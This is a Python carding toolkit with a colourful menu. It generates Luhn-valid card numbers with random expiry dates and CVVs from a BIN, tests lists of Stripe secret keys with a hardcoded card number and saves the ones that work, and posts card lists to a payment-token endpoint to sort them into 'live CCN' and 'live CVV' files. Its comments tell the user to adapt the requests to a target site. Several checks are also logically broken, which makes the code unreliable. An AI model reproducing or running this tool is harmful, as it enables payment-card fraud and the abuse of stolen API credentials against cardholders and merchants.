import os
import time
import luhn
from luhn import checkLuhn
try:
	import random
	import requests
	from bs4 import BeautifulSoup
	from colorama import init
	from termcolor import colored
	from requests.auth import HTTPBasicAuth
except:
	os.system('pip install random')
	os.system('pip install bs4')
	os.system('pip install colorama')
	os.system('pip install requests')
	os.system('pip install termcolor')
	import random
	import requests
	from bs4 import BeautifulSoup
	from colorama import init
	from termcolor import colored
init()
binlist = []
headers = {'user-agent':'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/93.0.4577.82 Safari/537.36'}
def clear():
	os.system('clear')
def clrd(msg):
	clr = ['blue','cyan','red','green','blue','yellow']
	clr1 = random.choice(clr)
	print(colored(f'''{msg}''',color = clr1))
def clrd1(msg):
	clr = ['blue','cyan','red','green','blue','yellow']
	clr1 = random.choice(clr)
	print(colored(f'''{msg}''',color = clr1),end = '')
def dead(msg):
	print(colored(f'\n{msg}	|DEAD',color = 'red'))
def live(msg):
	print(colored(f'\n{msg}	|LIVE',color = 'red'))
def banner():
	clrd('''


╭━━━┳━━━┳━━━┳╮╭━┳━━┳━━━┳━━━┳━━━┳━━┳━━━╮╱╱╱╱╭━━━┳━━━┳━╮╱╭┳━━━┳╮╱╱╭╮
╰╮╭╮┃╭━╮┃╭━╮┃┃┃╭┻┫┣┫╭━━┫╭━╮┃╭━╮┣┫┣┫╭━━╯╱╱╱╱┃╭━╮┃╭━╮┃┃╰╮┃┣╮╭╮┃╰╮╭╯┃
╱┃┃┃┃┃╱┃┃╰━╯┃╰╯╯╱┃┃┃╰━━┫┃╱╰┫╰━╯┃┃┃┃╰━━╮╱╱╱╱┃┃╱╰┫┃╱┃┃╭╮╰╯┃┃┃┃┣╮╰╯╭╯
╱┃┃┃┃╰━╯┃╭╮╭┫╭╮┃╱┃┃┃╭━━┫┃╱╭┫╭╮╭╯┃┃┃╭━━╯╭━━╮┃┃╱╭┫╰━╯┃┃╰╮┃┃┃┃┃┃╰╮╭╯
╭╯╰╯┃╭━╮┃┃┃╰┫┃┃╰┳┫┣┫╰━━┫╰━╯┃┃┃╰┳┫┣┫┃╱╱╱╰━━╯┃╰━╯┃╭━╮┃┃╱┃┃┣╯╰╯┃╱┃┃
╰━━━┻╯╱╰┻╯╰━┻╯╰━┻━━┻━━━┻━━━┻╯╰━┻━━┻╯╱╱╱╱╱╱╱╰━━━┻╯╱╰┻╯╱╰━┻━━━╯╱╰╯
	
				MADE BY @LEGENDPIKACHU_YT\n\n''')
clear()
banner()
clrd('		[+] HIT ANY KEY TO START ')
input()
print('\n')
def param(i,name):
	clrd1('	[')
	clrd1(f'{i}')
	clrd1(']	')
	clrd1(f'{name}')
	print('\n')
inpt = ''
def options():
	global inpt
	param('1',f'BIN CHECKER')
	param('2',f'CREDIT CARD GENERATOR')
	param('3',f'SK KEY CHECKER')
	param('4',f'CREDIT CARD CHECKER')
	param('5',f'EXIT')
	print('\n')
	clrd1('	ENTER YOUR DESIRED CHOICE SENPAI = ')
	inpt = input()
options()
inpt2 = ''
live_key = []
def rotater():
	clear()
	banner()
	param('1',f'SINGLE SK CHECKER')
	param('2',f'MASS SK CHECKER')
	param('3',f'EXIT')
	print('\n')
	clrd1('	ENTER YOUR DESIRED CHOICE SENPAI = ')
	inpt3 = input()
def rotatemaar():
	clear()
	banner()
	param('1',f'SINGLE BIN CHECKER')
	param('2',f'MASS BIN CHECKER')
	print('\n')
	clrd1('	ENTER YOUR DESIRED CHOICE SENPAI = ')
	inpt2 = input()
inpt3 = ''
headers1 = {'Content-Type': 'application/x-www-form-urlencoded'}
if inpt == '1':
	clear()
	banner()
	param('1',f'SINGLE BIN CHECKER')
	param('2',f'MASS BIN CHECKER')
	param('3',f'BACK')
	print('\n')
	clrd1('	ENTER YOUR DESIRED CHOICE SENPAI = ')
	inpt2 = input()
	if inpt2 == '1':
		clear()
		banner()
		clrd1('	[+] ENTER YOUR BIN = ')
		binhere = input()
		url = f'https://bins-ws-api.herokuapp.com/api/{binhere}'
		binchk = requests.get(url,headers = headers)
		bindata = binchk.text
		print('\n')
		clrd('	■■■■■■ BIN DATA ■■■■■■\n')
		bindata = bindata.replace('{"bin":','BIN = ')
		bindata =bindata.replace(',"type":','\nTYPE = ')
		bindata = bindata.replace(',"level":','\nLEVEL = ')
		bindata = bindata.replace(',"brand":','\nBRAND = ')
		bindata = bindata.replace(',"bank":','\nBANK = ')
		bindata = bindata.replace(',"country":','\nCOUNTRY = ')
		bindata = bindata.replace('}','')
		clrd(bindata)
		print('\n\n')
		param('1','BACK')
		param('2','EXIT')
		optlelo = input('\n Enter You Choice = ')
		if optlelo == '1':
			clear()
			banner()
			options()
		elif optlelo == '2':
			input('\n\n [+] HIT ANY KEY TO EXIT')
		else:
			pass
	elif inpt2 == '2':
		clear()
		banner()
		clrd1('	[+] ENTER THE PATH OF THE BINS FILE = ')
		fil = input()
		binfile = open(fil).readlines()
		Total = len(binfile)
		for lines in binfile:
			line = lines.replace('\n','')
			bn = binlist.append(line)
		for i in range(0,Total):
			url = 'https://bins-ws-api.herokuapp.com/api/'+binlist[i]
			binchk = requests.get(url,headers = headers)
			bindata = binchk.text
			print('\n')
			clrd('	■■■■■■ BIN DATA ■■■■■■\n')
			bindata = bindata.replace('{"bin":','BIN = ')
			bindata =bindata.replace(',"type":','\nTYPE = ')
			bindata = bindata.replace(',"level":','\nLEVEL = ')
			bindata = bindata.replace(',"brand":','\nBRAND = ')
			bindata = bindata.replace(',"bank":','\nBANK = ')
			bindata = bindata.replace(',"country":','\nCOUNTRY = ')
			bindata = bindata.replace('}','')
			rslt = open('Bin-Valid.txt','w+').write(bindata +'\n')
			rslt = open('Bin-Valid.txt','a').write(bindata +'\n')
			clrd(bindata)
		print('\n\n')
		param('1','BACK')
		param('2','EXIT')
		optlelo = input('\n Enter You Choice = ')
		if optlelo == '1':
			clear()
			banner()
			options()
		elif optlelo == '2':
			input('\n\n [+]HIT ANY KEY TO EXIT')
		else:
			pass
	elif inpt2 == '3':
		clear()
		banner()
		options()
	else:
		while inpt2 not in ['1','2','3']:
			rotatemaar() 
elif inpt == '2':
	clear()
	banner()
	months = ['01','02','03','04','05','06','07','08','09','10','11','12']
	reyar = []
	cc = []
	clrd1('Enter Your Bin = ')
	bnn = input()
	print('\n')
	Total = int(input('HOW MANY CARDS TO GENERATE = '))
	print('\n')
	lp = requests.get(f'https://bins-ws-api.herokuapp.com/api/{bnn}')
	lk = lp.text
	for x in bnn:
		bin = bnn.split('x')[0]
	dudu = len(bin)
	uwu =0
	def sex():
		global uwu
		uwu = 15 - dudu
	def sex1():
		global uwu
		uwu = 16 - dudu
	def randrover():
		for i in range(0,uwu):
			r = str(random.randint(0,9))
			r2 = reyar.append(r)
		hehe = ''.join(reyar)
		reyar.clear()
		return hehe
	luhn_count = 0
	if 'AMERICAN EXPRESS' in lk:
		sex()
		for i in range(100000000):
			month = random.choice(months)
			year = str(random.randint(21,30))
			cvv = random.randint(0000,9999)
			cvv3 = str(cvv)
			if len(cvv3) == 2:
				rndi2 = random.randint(0,9)
				rndi = random.randint(0,9)
				cvv = f'{cvv}{rndi}{rndi2}'
			elif len(cvv3) == 1:
				rndi2 = random.randint(0,9)
				rndi = random.randint(0,9)
				rndi3 = random.randint(0,9)
				cvv = f'{cvv}{rndi}{rndi2}{rndi3}'
			elif len(cvv3) == 3:
				rndi = random.randint(0,9)
				cvv = f'{cvv}{rndi}'
			rez = bin+randrover()
			rez2 = f'{rez}|{month}|{year}|{cvv}'
			if (checkLuhn(rez)):
				print(rez2)
				cc.append(rez2)
				luhn_count +=1
				if luhn_count == Total:
					break
	elif 'DISCOVER' in lk:
		sex1()
		for i in range(100000000):
			month = random.choice(months)
			year = str(random.randint(21,30))
			cvv = random.randint(000,999)
			cvv3 = str(cvv)
			if len(cvv3) == 2:
				rndi = random.randint(0,9)
				cvv = f'{cvv}{rndi}'
			elif len(cvv3) == 1:
				rndi2 = random.randint(0,9)
				rndi = random.randint(0,9)
				cvv = f'{cvv}{rndi}{rndi2}'
			rez = bin+randrover()
			rez2 = f'{rez}|{month}|{year}|{cvv}'
			if (checkLuhn(rez)):
				print(rez2)
				cc.append(rez2)
				luhn_count +=1
				if luhn_count == Total:
					break
	elif 'VISA' in lk:
		sex1()
		for i in range(100000000):
			month = random.choice(months)
			year = str(random.randint(21,30))
			cvv = random.randint(000,999)
			cvv3 = str(cvv)
			if len(cvv3) == 2:
				rndi = random.randint(0,9)
				cvv = f'{cvv}{rndi}'
			elif len(cvv3) == 1:
				rndi2 = random.randint(0,9)
				rndi = random.randint(0,9)
				cvv = f'{cvv}{rndi}{rndi2}'
			rez = bin+randrover()
			rez2 = f'{rez}|{month}|{year}|{cvv}'
			if (checkLuhn(rez)):
				print(rez2)
				cc.append(rez2)
				luhn_count +=1
				if luhn_count == Total:
					break
	elif 'MASTERCARD' in lk:
		sex1()
		for i in range(10000000000):
			month = random.choice(months)
			year = str(random.randint(21,30))
			cvv = random.randint(000,999)
			cvv3 = str(cvv)
			if len(cvv3) == 2:
				rndi = random.randint(0,9)
				cvv = f'{cvv}{rndi}'
			elif len(cvv3) == 1:
				rndi2 = random.randint(0,9)
				rndi = random.randint(0,9)
				cvv = f'{cvv}{rndi}{rndi2}'
			rez = bin+randrover()
			rez2 = f'{rez}|{month}|{year}|{cvv}'
			if (checkLuhn(rez)):
				print(rez2)
				cc.append(rez2)
				luhn_count +=1
				if luhn_count == Total:
					break
	else:
		print('UNABLE TO IDENTOFY THE BIN!')
	with open('Generated.txt','w+') as f:
		f.write('\n'.join(cc))
elif inpt == '3':
	clear()
	banner()
	param('1',f'SINGLE SK CHECKER')
	param('2',f'MASS SK CHECKER')
	param('3',f'EXIT')
	print('\n')
	clrd1('	ENTER YOUR DESIRED CHOICE SENPAI = ')
	inpt3 = input()
	if inpt3 == '1':
		clear()
		banner()
		clrd1('	[+] ENTER THE SK KEY = ')
		sk_key = input()
		url1 = 'https://api.stripe.com/v1/tokens'
		chkme = requests.post(url1,auth = HTTPBasicAuth(sk_key,sk_key), headers = headers1,data = 'card[number]=5278540001668044&card[exp_month]=10&card[exp_year]=2024&card[cvc]=252')
		sk = chkme.text
		if 'api_key_expired' in sk:
			print(colored(f'\n{sk_key}	| DEAD',color = 'red'))
		elif 'Invalid API Key provided' in sk:
			dead(sk_key)
		elif 'You did not provide an API key.' or 'You need to provide your API key in the Authorization header,' in sk:
			dead(sk_key)
		elif 'testmode_charges_only' or 'test_mode_live_card' in sk:
			dead(sk_key)
		else:
			live(sk_key)
		clrd1('	[+] HIT ANY KEY TO EXIT ')
		input()
	elif inpt3 == '2':
		clear()
		banner()
		clrd1('	[+] ENTER THE PATH OF SK KEY FILE = ')
		sk_ket = input()
		sk_ker = open(sk_ket).readlines()
		for sk_key in sk_ker:
			sk_key = sk_key.replace('\n','')
			url1 = 'https://api.stripe.com/v1/tokens'
			chkme = requests.post(url1,auth = HTTPBasicAuth(sk_key,sk_key), headers = headers1,data = 'card[number]=5278540001668044&card[exp_month]=10&card[exp_year]=2024&card[cvc]=252')
			sk = chkme.text
			if 'api_key_expired' in sk:
				print(colored(f'\n{sk_key}	| DEAD',color = 'red'))
			elif 'Invalid API Key provided' in sk:
				dead(sk_key)
			elif 'You did not provide an API key.' or 'You need to provide your API key in the Authorization header,' in sk:
				dead(sk_key)
			elif 'testmode_charges_only' or 'test_mode_live_card' in sk:
				dead(sk_key)
			else:
				live_key.append(sk_key)
				live(sk_key)
				sve = open('SK-KEYS.txt', 'w+')
				sve.close
				sver = open('SK-KEYS.txt', 'a').write(sk_key)
		clear()
		banner()
		print('\n')
		for i in range(0,len(live_key)):
			live(live_key[i])
		clrd('\n'+str(len(live_key))+' LIVE SK KEYS HAVE BEEN SAVED IN FILE |SK-KEYS.txt|')
		print('\n\n')
		clrd1('	[+] HIT ANY KEY TO EXIT ')
		input()
	elif inpt3 == '3':
		clear()
		banner()
		options()
	else:
		while inpt3 not in ['1','2','3']:
			rotater()
elif inpt == '4':
	import re,json,string
	CC = [] 
	#make a random email
	def email():
		return ''.join(random.choice(string.ascii_lowercase)for x in range(random.randint(7,15)))+ str(random.randint(1111,9999)) + '@gmail.com'
	#FILE LOADER
	clear()
	banner()
	clrd1('ENTER THE PATH OF THE CC FILE = ')
	path = input()
	while path == '':
		clear()
		clrd('PLEASE ENTER THE PATH OF THE CC FILE')
		clear()
		banner()
		clrd1('ENTER THE PATH OF THE CC FILE = ')
		path = input()
		continue
	file = open(path, encoding = "utf-8").readlines()
	for lines in file:
		lines = lines.replace('\n','')
		CC.append(lines)
	#MAIN PROGRAM STARTS
	for items in CC:
		list = items
		cc = list.split('|')[0]
		month = list.split('|')[1]
		year = list.split('|')[2]
		cvv = list.split('|')[3]
		# stripe req  ''' make change'''
		url = 'https://google.com'
		# make changes here also
		headers = {
		'authority': 'api.stripe.com',
		'method': 'POST',
		'path': 'v1/tokens',
		'scheme': 'https',
		'accept': 'application/json',
		'content-type': 'application/x-www-form-urlencoded',
		'origin': 'https://js.stripe.com',
		'referr': 'https://js.sttipe.com/',
		'sec-fetch-dest': 'empty',
		'sec-fetch-mode': 'cors',
		'sec-fetch-site': 'same-site',
		'sec-gpc': '1',
		'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/93.0.4577.82 Safari/537.36'}# post req data ''' you have to make changes here'''
		data = {
		'card[number]': cc,
		'card[cvv]': cvv,
		'card[exp_month]': month,
		'card[exp_year]': year,
		'card[address_zip]': '10001',
		'payment_user_agent': 'stripe.js/515271568; stripe-js-v3/515271568'}#change  according to your request
		#posting data
		bye = requests.post(url,headers = headers,data  = data)
		post = json.loads(bye.text)
		id = post["id"]
		#req 2
		url2 = 'https://google.com' #your url here
		headers = {
		'authority': 'api.stripe.com',
		'method': 'POST',
		'path': 'v1/tokens',
		'scheme': 'https',
		'accept': 'application/json',
		'content-type': 'application/x-www-form-	urlencoded',
		'origin': 'https://js.stripe.com',
		'referr': 'https://js.sttipe.com/',
		'sec-fetch-dest': 'empty',
		'sec-fetch-mode': 'cors',
		'sec-fetch-site': 'same-site',
		'sec-gpc': '1',
		'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/93.0.4577.82 Safari/537.36'}#change as per urs
		postdata = '{"email":"'+email()+'","coupon_code":"","stripe_token":"'+id()+'}'#change afterwards
		now = requests.post(url2,headers = headers,data = postdata)
		CCN_LIST = []
		CVV_LIST = []
		CCN = 0
		CVV = 0
		DEAD = 0
	#Key Check #
		def Counter():
			clear()
			clrd(f'\nDEAD = {DEAD}')
			clrd(f'\nCCN = {CCN}')
			clrd(f'\nCVV = {CVV}')
			clrd(f'\n#################\n\n')
			for xs in CCN_LIST:
				clrd(f'{xs}              | CCN MATCHED')
				ccn_save = open('LIVE_CCN.txt','a').write(xs+'\n')
				ccn_save.close()
			for xss in CVV_LIST:
				clrd(f'{xss}              | CVV MATCHED')
				cvv_save = open('LIVE_CVV.txt','a').write(xss+'\n')
				cvv_save.close()
		if 'security code is incorrect' in now.text:
			CCN +=1
			CCN_LIST.append(items)
			Counter()
		elif 'card was declined' in now.text:
			DEAD +=1
			Counter()
		elif 'cvv matched' in now.text:
			CVV += 1
			CVV_LIST.append(items)
			Counter()
		else:
			DEAD +=1
			Counter()#CHANGE RESPONSE ACCORDING TO YOUR SITE :)
elif inpt == '5':
	exit()
else:
	print('\nNOT A VALID OPTION HENCE EXITING.')